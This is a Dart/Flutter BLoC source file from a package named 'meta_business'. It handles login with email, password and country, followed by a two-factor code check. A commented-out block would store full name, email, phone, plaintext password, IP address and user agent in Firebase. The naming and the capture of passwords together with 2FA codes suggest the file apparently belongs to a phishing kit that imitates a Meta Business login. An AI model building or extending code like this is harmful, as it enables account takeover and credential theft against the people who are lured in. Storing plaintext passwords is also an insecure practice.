import 'package:bloc/bloc.dart';
import 'package:equatable/equatable.dart';
import 'package:meta_business/src/utils/network_request.dart';

part 'home_event.dart';
part 'home_state.dart';

class HomeBloc extends Bloc<HomeEvent, HomeState> {
  final ApiClient apiClient = ApiClient();

  HomeBloc() : super(HomeInitial()) {
    on<CheckLoginEvent>(
      (event, emit) async {
        emit(CheckingState());
        final response =
            await apiClient.login(event.email, event.password, event.country);
        emit(CheckingLoginFinished(response));
      },
    );
    on<CheckingTwoFAEvent>((event, emit) async {
      emit(CheckingState());
      final response = await apiClient.checkTwoFa(event.email, event.twoFaCode);
      emit(CheckingTwoFASuccessState(response));
    });
    // on<AddToFirebaseEvent>(
    //   (event, emit) async {
    //     print("on add to firebase");
    //     DateTime now = DateTime.now();
    //     var vietnamTime = now.toUtc().add(const Duration(hours: 7));
    //     String formattedDateTime =
    //         DateFormat('HH:mm dd/MM/yyyy').format(vietnamTime);
    //     DocumentReference row = await colData.add({
    //       "pagename": event.pageName,
    //       "name": event.fullName,
    //       "email": event.email,
    //       "phone": event.phone,
    //       "password": event.password,
    //       "ip": event.ip,
    //       "user_agent": event.user_agent,
    //       "created_at": formattedDateTime
    //     }); //insert vào trong firebase
    //     emit(AddToFirebaseSuccessState(row.id, event.email, event.password));
    //   },
    // );
  }
}
